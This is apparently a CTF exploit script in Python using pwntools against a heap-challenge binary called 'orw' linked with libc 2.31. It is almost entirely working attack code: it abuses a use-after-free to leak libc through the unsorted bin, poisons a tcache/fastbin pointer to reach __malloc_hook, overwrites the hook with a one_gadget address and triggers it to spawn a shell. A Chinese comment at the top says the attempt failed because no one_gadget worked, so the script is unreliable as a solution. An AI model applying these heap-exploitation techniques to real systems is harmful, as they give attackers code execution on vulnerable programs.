#未成功，原因：所有onegadget都不适用
from os import system
from pwn import * 
from LibcSearcher import * 
# context.log_level = 'debug' 
p=process('./orw')
# p=remote('t.ctf.qwq.cc',49974)
elf=ELF('./orw')
libc=ELF('./libc-2.31.so')
def add(length,content):
    p.recvuntil(b'>> ')
    p.sendline(b'1')
    p.recvuntil(b'Length of game description:\n')
    p.sendline(str(length).encode())
    p.recvuntil(b'Game description:\n')
    p.sendline(content)
def free(index):
    p.recvuntil(b'>> ')
    p.sendline(b'2')
    p.recvuntil(b'game index: ')
    p.sendline(str(index).encode())
def edit(index,content):
    p.recvuntil(b'>> ')
    p.sendline(b'3')
    p.recvuntil(b'game index: ')
    p.sendline(str(index).encode())
    p.recvuntil(b'Edit Game description:\n')
    p.sendline(content)
def show(index):
    p.recvuntil(b'>> ')
    p.sendline(b'4')
    p.recvuntil(b'game index: ')
    p.sendline(str(index).encode())
for i in range(7):
    add(0x100,b'/bin/sh\x00')
for i in range(7):
    add(0x50,b'/bin/sh\x00')
add(0x100,b'/bin/sh\x00')#14
add(0x50,b'/bin/sh\x00')#15
add(0x50,b'/bin/sh\x00')#16
for i in range(14):
    free(i)

show(1)
get_addr=u64(p.recv(6).ljust(8,b'\x00'))
print(hex(get_addr))
free(14)
show(14)

main_arena_96=u64(p.recv(6).ljust(8,b'\x00'))
malloc_hook=main_arena_96-0x70
libcbase=malloc_hook-libc.symbols['__malloc_hook']
print('malloc_hook',hex(malloc_hook))
print('libcbase',hex(libcbase))
system_addr=libcbase+libc.symbols['system']
one_gadget=libcbase+0xe3b31
# 0xe3b2e
# 0xe3b31
# 0xe3b34
add(0x30,b'/bin/sh\x00')#17
free(15)
free(16)
hackloc=malloc_hook-0x38
print(hex(hackloc))
edit(16,p64(hackloc))
pause()
for i in range(7):
    add(0x50,b'')
add(0x50,b'')
add(0x50,b'')
edit(26,b'\x00'*0x28+p64(one_gadget)[0:7])
pause()
add(0x100,b'')
p.interactive()